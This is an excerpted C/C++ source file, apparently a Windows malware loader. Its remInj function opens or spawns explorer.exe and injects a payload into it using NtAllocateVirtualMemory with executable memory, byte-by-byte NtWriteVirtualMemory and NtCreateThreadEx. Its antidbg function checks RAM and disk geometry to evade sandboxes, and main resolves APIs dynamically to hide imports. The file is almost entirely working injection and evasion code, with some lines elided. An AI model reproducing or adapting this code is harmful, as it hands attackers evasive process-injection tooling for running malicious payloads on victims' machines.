...
int remInj() {
    if (find() != 0) {
        processHandle = ((OPENPROCESS)api.pOpenProcess)(PROCESS_ALL_ACCESS, FALSE, DWORD(find()));
    }
    else if (((CREATEPROCESSW)api.pCreateProcessW)(L"C:\\Windows\\explorer.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &info, &processInfo) != 0) {
        processHandle = ((OPENPROCESS)api.pOpenProcess)(PROCESS_ALL_ACCESS, FALSE, DWORD(find()));
    }
    else {
        return 0;
    ...
    status = ((NTALLOCATEVIRTUALMEMORY)api.pNtAllocateVirtualMemory)(processHandle, &remoteBuf, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!status) {
    }
    ...
    for (int i = 0; i < sizeof(payload); i++) {
        ...
        status = ((NTWRITEVIRTUALMEMORY)api.pNtWriteVirtualMemory)(processHandle, LPVOID((ULONG_PTR)remoteBuf + n), &singByte, 0x1, NULL);
        if (!status) {
            n++;
            if (checkWrite == 0) {
                checkWrite = 1;
    ...
    HANDLE hThread;
    ((NTCREATETHREADEX)api.pNtCreateThreadEx)(&hThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuf, 0, NULL, NULL, NULL, NULL, NULL);
    WaitForSingleObject(HANDLE(hThread), 1000);

    ((NTCLOSE)api.pNtClose)(processHandle);
...
int antidbg() {
    ...
    ((GLOBALMEMORYSTATUSEX)api.pGlobalMemoryStatusEx)(&memoryStatus);
    DWORD RAM = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAM < 4096) {
        return -1;
    }
    HANDLE hDevice = ((CREATEFILEW)api.pCreateFileW)(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    ((DEVICEIOCONTROL)api.pDeviceIoControl)(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
...
int main(int argc, char* argv[]) {
    LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    GETPROCADDRESS pGetProcAddress = (GETPROCADDRESS)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");

    ResolveAPIs(pLoadLibraryA, pGetProcAddress, &api);
